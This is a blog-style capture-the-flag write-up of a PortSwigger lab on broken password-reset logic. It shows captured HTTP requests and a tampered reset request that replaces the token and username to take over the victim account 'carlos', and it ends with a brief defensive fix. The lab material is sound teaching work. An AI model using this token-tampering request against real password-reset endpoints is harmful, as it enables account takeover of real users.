---
layout: post
title: "PortSwigger Lab: Password reset broken logic"
date: 2026-02-08
categories:
  [
    "PortSwigger",
    "Practice",
    "Authentication Vulnerabilities",
    "Vulnerabilities in other authentication mechanisms",
  ]
tags:
  - "PortSwigger"
  - "Authentication Vulnerabilities"
  - "Vulnerabilities in other authentication mechanisms"
  - "Password Reset"
  - "Logic Flaws"
  - "Burp Suite"
---

# PortSwigger Lab: Password reset broken logic

# Table of Contents

- [Overview / Goal](#overview--goal)
- [Lab Setup and Tools](#lab-setup-and-tools)
- [Solution Steps](#solution-steps)
- [What I'd Do Next (Blue Team)](#what-id-do-next)
- [Try This Lab Yourself](#try-this-lab-yourself)

---

# Overview / Goal {#overview--goal}

> This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.
>
> - Your credentials: `wiener:peter`
> - Victim's username: `carlos`

Pretty straightforward lab description. Password reset logic is broken somewhere.

# Lab Setup and Tools {#lab-setup-and-tools}

- Burp Suite + Firefox (through FoxyProxy)

---

# Solution Steps {#solution-steps}

**1) Triggering a Normal Password Reset**

I started by logging in with my given creds just to see normal behaviour. Nothing special stood out in the login flow.

Since this lab is clearly about password reset, I logged out and went straight for that.

Submitting my username generated the following request:

```http
POST /forgot-password HTTP/2
Host: 0a88004004da336a82187e610037003a.web-security-academy.net
Cookie: session=isUNkJ3Sqzkpr5NJTGEiiDq2S6NXs9dA
Content-Type: application/x-www-form-urlencoded

username=wiener
```

The emulated email client received a reset link:

```plaintext
Hello!
Please follow the link below to reset your password.
https://0a88004004da336a82187e610037003a.web-security-academy.net/forgot-password?temp-forgot-password-token=m8g5rhxn13s95anx23dpf9838h8ci02f
Thanks, Support team
```

Clicking the link loaded the password reset page as expected.

**2) Observing the Reset Request**

When I submitted a new password (I reused `peter`), Burp showed this request:

```http
POST /forgot-password?temp-forgot-password-token=m8g5rhxn13s95anx23dpf9838h8ci02f HTTP/2
Host: 0a88004004da336a82187e610037003a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=m8g5rhxn13s95anx23dpf9838h8ci02f&username=wiener&new-password-1=peter&new-password-2=peter
```

**3) Resetting Carlos's Password**

I took the same request and modified it:

```http
POST /forgot-password?temp-forgot-password-token=meow HTTP/2
Host: 0a88004004da336a82187e610037003a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=meow&username=carlos&new-password-1=peter&new-password-2=peter
```

Changes made:

- Replaced the token with a random value (meow) 😺
- Changed the username from `wiener` to `carlos`

No validation.
No ownership check.
No token-to-user binding.

After sending the request, I went back to the login page, logged in as `carlos:peter`, and landed straight on the account page.

Lab solved ✅

---

# What I'd Do Next (Blue Team) {#what-id-do-next}

- Validate the token instead of trusting client-supplied parameters.

---

# Try This Lab Yourself {#try-this-lab-yourself}

🔗 Lab Link: [PortSwigger Lab: Password reset broken logic](https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/vulnerabilities-in-other-authentication-mechanisms/authentication/other-mechanisms/lab-password-reset-broken-logic){:target="\_blank"}
